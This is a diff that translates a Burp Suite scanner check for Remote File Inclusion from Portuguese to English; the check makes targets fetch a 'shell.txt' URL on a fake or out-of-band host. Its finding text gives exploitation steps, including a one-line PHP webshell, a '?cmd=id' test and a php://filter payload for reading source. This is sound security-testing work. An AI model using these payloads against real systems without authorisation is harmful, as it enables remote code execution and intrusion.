@@ -13,13 +13,12 @@ import java.util.List;
 import java.util.regex.Pattern;
 
 /**
- * Testa parâmetros de inclusão de arquivo/página (típicos de apps PHP mais
- * antigos) com uma URL externa inexistente, procurando por mensagens de erro
- * que comprovem que o servidor TENTOU buscar/incluir aquela URL remota
- * (Remote File Inclusion — detecção baseada em erro, sem precisar hospedar
- * payload externo).
+ * Tests file/page inclusion parameters (typical of older PHP apps) with a
+ * nonexistent external URL, looking for error messages proving the server
+ * TRIED to fetch/include that remote URL (Remote File Inclusion —
+ * error-based detection, no need to host an external payload).
  *
- * Criado por Rx0 - @rodrigocoutinho91
+ * Created by Rx0 - @rodrigocoutinho91
  */
 public class RfiCheck implements VulnCheck {
 
@@ -28,57 +27,57 @@ public class RfiCheck implements VulnCheck {
             "module", "view", "content", "path"
     };
 
-    // Domínio propositalmente inexistente — se o servidor tentar resolver/buscar, o erro confirma RFI
-    private static final String DOMINIO_FALSO = "rx0-rfi-test-" + (System.currentTimeMillis() % 100000) + ".invalid-nao-existe.test";
-    private static final String PAYLOAD = "http://" + DOMINIO_FALSO + "/shell.txt";
+    // Deliberately nonexistent domain — if the server tries to resolve/fetch it, the error confirms RFI
+    private static final String FAKE_DOMAIN = "rx0-rfi-test-" + (System.currentTimeMillis() % 100000) + ".invalid-does-not-exist.test";
+    private static final String PAYLOAD = "http://" + FAKE_DOMAIN + "/shell.txt";
 
-    private static final Pattern[] ASSINATURAS_INCLUDE_REMOTO = {
-            Pattern.compile("failed to open stream.*" + Pattern.quote(DOMINIO_FALSO), Pattern.CASE_INSENSITIVE),
-            Pattern.compile("include\\(.*" + Pattern.quote(DOMINIO_FALSO) + ".*\\)", Pattern.CASE_INSENSITIVE),
-            Pattern.compile("require\\(.*" + Pattern.quote(DOMINIO_FALSO) + ".*\\)", Pattern.CASE_INSENSITIVE),
-            Pattern.compile("getaddrinfo failed.*" + Pattern.quote(DOMINIO_FALSO), Pattern.CASE_INSENSITIVE),
-            Pattern.compile("URL file-access is disabled", Pattern.CASE_INSENSITIVE), // allow_url_include=off — confirma que o include aceitou URL
+    private static final Pattern[] REMOTE_INCLUDE_SIGNATURES = {
+            Pattern.compile("failed to open stream.*" + Pattern.quote(FAKE_DOMAIN), Pattern.CASE_INSENSITIVE),
+            Pattern.compile("include\\(.*" + Pattern.quote(FAKE_DOMAIN) + ".*\\)", Pattern.CASE_INSENSITIVE),
+            Pattern.compile("require\\(.*" + Pattern.quote(FAKE_DOMAIN) + ".*\\)", Pattern.CASE_INSENSITIVE),
+            Pattern.compile("getaddrinfo failed.*" + Pattern.quote(FAKE_DOMAIN), Pattern.CASE_INSENSITIVE),
+            Pattern.compile("URL file-access is disabled", Pattern.CASE_INSENSITIVE), // allow_url_include=off — confirms the include accepted a URL
             Pattern.compile("allow_url_include", Pattern.CASE_INSENSITIVE),
     };
 
     @Override
-    public String nome() {
-        return "RFI — Remote File Inclusion (probe baseado em erro)";
+    public String name() {
+        return "RFI — Remote File Inclusion (error-based probe)";
     }
 
     @Override
-    public List<Finding> executar(MontoyaApi api, String baseUrl) {
-        return executar(api, baseUrl, (ScanContext) null);
+    public List<Finding> execute(MontoyaApi api, String baseUrl) {
+        return execute(api, baseUrl, (ScanContext) null);
     }
 
     @Override
-    public List<Finding> executar(MontoyaApi api, String baseUrl, ScanContext ctx) {
-        List<Finding> achados = new ArrayList<>();
+    public List<Finding> execute(MontoyaApi api, String baseUrl, ScanContext ctx) {
+        List<Finding> findings = new ArrayList<>();
         String base = baseUrl.endsWith("/") ? baseUrl.substring(0, baseUrl.length() - 1) : baseUrl;
 
-        // --- Confirmação OOB via interactsh: usa um host REAL (que responde HTTP) em vez do domínio falso ---
-        if (ctx != null && ctx.interactsh() != null && ctx.interactsh().isDisponivel()) {
+        // --- OOB confirmation via interactsh: uses a REAL host (that responds to HTTP) instead of the fake domain ---
+        if (ctx != null && ctx.interactsh() != null && ctx.interactsh().isAvailable()) {
             for (String param : PARAM_NAMES) {
                 try {
-                    String host = ctx.interactsh().criarProbe(
-                            "RFI confirmado via interação out-of-band no parâmetro '" + param + "'",
-                            Severity.CRITICA,
+                    String host = ctx.interactsh().createProbe(
+                            "RFI confirmed via out-of-band interaction in parameter '" + param + "'",
+                            Severity.CRITICAL,
                             base,
-                            "O servidor efetivamente buscou/incluiu a URL remota de teste no parâmetro '" + param + "' — " +
-                                    "confirmação inequívoca de Remote File Inclusion, com a requisição HTTP sendo recebida " +
-                                    "de verdade (diferente da detecção por mensagem de erro, que é mais fraca).",
-                            "Nunca passe entrada do usuário para funções de include/require/fopen com suporte a wrapper de URL. " +
-                                    "Desabilite allow_url_include e allow_url_fopen, e use allowlist fixa de arquivos permitidos.",
-                            "1) Hospede um webshell real nesse mesmo tipo de endpoint externo e repita o teste pra confirmar " +
-                                    "execução de código (não só inclusão). 2) O fato de o servidor ter feito a requisição HTTP " +
-                                    "já é RFI confirmado — qualquer conteúdo PHP/JSP/ASP hospedado lá seria executado no alvo.");
+                            "The server actually fetched/included the test remote URL in parameter '" + param + "' — " +
+                                    "an unambiguous confirmation of Remote File Inclusion, with the HTTP request really " +
+                                    "being received (unlike error-message detection, which is weaker).",
+                            "Never pass user input into include/require/fopen functions that support URL wrappers. " +
+                                    "Disable allow_url_include and allow_url_fopen, and use a fixed allowlist of permitted files.",
+                            "1) Host a real webshell at this same kind of external endpoint and repeat the test to confirm " +
+                                    "code execution (not just inclusion). 2) The fact that the server made the HTTP request " +
+                                    "is already confirmed RFI — any PHP/JSP/ASP content hosted there would be executed on the target.");
                     if (host != null) {
-                        String payloadOob = "http://" + host + "/shell.txt";
-                        String urlOob = base + "/?" + param + "=" + java.net.URLEncoder.encode(payloadOob, "UTF-8");
-                        api.http().sendRequest(HttpRequest.httpRequestFromUrl(urlOob));
+                        String oobPayload = "http://" + host + "/shell.txt";
+                        String oobUrl = base + "/?" + param + "=" + java.net.URLEncoder.encode(oobPayload, "UTF-8");
+                        api.http().sendRequest(HttpRequest.httpRequestFromUrl(oobUrl));
                     }
                 } catch (Exception e) {
-                    api.logging().logToError("[Rx0] Erro ao disparar probe OOB de RFI (param " + param + "): " + e.getMessage());
+                    api.logging().logToError("[Rx0] Error firing RFI OOB probe (param " + param + "): " + e.getMessage());
                 }
             }
         }
@@ -93,39 +92,39 @@ public class RfiCheck implements VulnCheck {
                 String body = resp.bodyToString();
                 if (body == null) continue;
 
-                for (Pattern p : ASSINATURAS_INCLUDE_REMOTO) {
+                for (Pattern p : REMOTE_INCLUDE_SIGNATURES) {
                     if (p.matcher(body).find()) {
-                        boolean confirmaFuncaoVulneravel = p.pattern().contains("allow_url_include") || p.pattern().contains("URL file-access");
-                        achados.add(new Finding(
-                                (confirmaFuncaoVulneravel
-                                        ? "Parâmetro aceita URL em função include/require (RFI possivelmente bloqueado por config)"
-                                        : "Possível RFI confirmado no parâmetro '" + param + "'"),
-                                confirmaFuncaoVulneravel ? Severity.MEDIA : Severity.CRITICA,
+                        boolean confirmsVulnerableFunction = p.pattern().contains("allow_url_include") || p.pattern().contains("URL file-access");
+                        findings.add(new Finding(
+                                (confirmsVulnerableFunction
+                                        ? "Parameter accepts a URL in an include/require function (RFI possibly blocked by config)"
+                                        : "Possible RFI confirmed in parameter '" + param + "'"),
+                                confirmsVulnerableFunction ? Severity.MEDIUM : Severity.CRITICAL,
                                 url,
-                                confirmaFuncaoVulneravel
-                                        ? "O servidor processa o parâmetro em uma função de inclusão de arquivo e tentou tratá-lo como URL remota, " +
-                                          "mas a busca de URL externa está desabilitada (allow_url_include=Off). Hoje não é explorável, mas o padrão " +
-                                          "de código é perigoso — se essa configuração mudar, vira RFI completo."
-                                        : "O servidor tentou buscar a URL remota forjada que enviamos no parâmetro '" + param + "' (erro de DNS/stream " +
-                                          "referenciando nosso domínio de teste apareceu na resposta), confirmando que a entrada é usada diretamente em " +
-                                          "uma função de inclusão/leitura remota.",
-                                "Payload: " + PAYLOAD + " | Assinatura: " + p.pattern(),
-                                "Nunca passe entrada do usuário para funções de include/require/fopen com suporte a wrapper de URL. " +
-                                        "Desabilite allow_url_include e allow_url_fopen, e use allowlist fixa de arquivos permitidos.",
-                                confirmaFuncaoVulneravel
-                                        ? "1) Mesmo com allow_url_include=Off, teste php://filter/convert.base64-encode/resource=index.php " +
-                                          "no mesmo parâmetro pra ler código-fonte (isso não depende de allow_url_include). 2) Reavalie se a " +
-                                          "config pode mudar em outro ambiente (staging, por exemplo)."
-                                        : "1) Hospede um arquivo 'shell.txt' com um webshell PHP simples (ex: <?php system($_GET['cmd']); ?>) " +
-                                          "em um servidor que você controla. 2) No Repeater, troque o payload pelo link real desse arquivo no " +
-                                          "parâmetro '" + param + "'. 3) Se incluído, acesse <url_alvo>?cmd=id pra confirmar execução remota de código completa."));
+                                confirmsVulnerableFunction
+                                        ? "The server processes the parameter in a file-inclusion function and tried to treat it as a remote URL, " +
+                                          "but fetching external URLs is disabled (allow_url_include=Off). It is not exploitable today, but the code " +
+                                          "pattern is dangerous — if this setting ever changes, it becomes full RFI."
+                                        : "The server tried to fetch the forged remote URL we sent in parameter '" + param + "' (a DNS/stream " +
+                                          "error referencing our test domain appeared in the response), confirming the input is used directly in " +
+                                          "a remote inclusion/read function.",
+                                "Payload: " + PAYLOAD + " | Signature: " + p.pattern(),
+                                "Never pass user input into include/require/fopen functions that support URL wrappers. " +
+                                        "Disable allow_url_include and allow_url_fopen, and use a fixed allowlist of permitted files.",
+                                confirmsVulnerableFunction
+                                        ? "1) Even with allow_url_include=Off, test php://filter/convert.base64-encode/resource=index.php " +
+                                          "on the same parameter to read source code (this does not depend on allow_url_include). 2) Reassess whether " +
+                                          "the setting could differ in another environment (staging, for example)."
+                                        : "1) Host a 'shell.txt' file with a simple PHP webshell (e.g. <?php system($_GET['cmd']); ?>) " +
+                                          "on a server you control. 2) In Repeater, swap the payload for the real link to that file in " +
+                                          "parameter '" + param + "'. 3) If included, visit <target_url>?cmd=id to confirm full remote code execution."));
                         break;
                     }
                 }
             } catch (Exception e) {
-                api.logging().logToError("[Rx0] Erro no check de RFI (param " + param + "): " + e.getMessage());
+                api.logging().logToError("[Rx0] Error in RFI check (param " + param + "): " + e.getMessage());
             }
         }
-        return achados;
+        return findings;
     }
 }
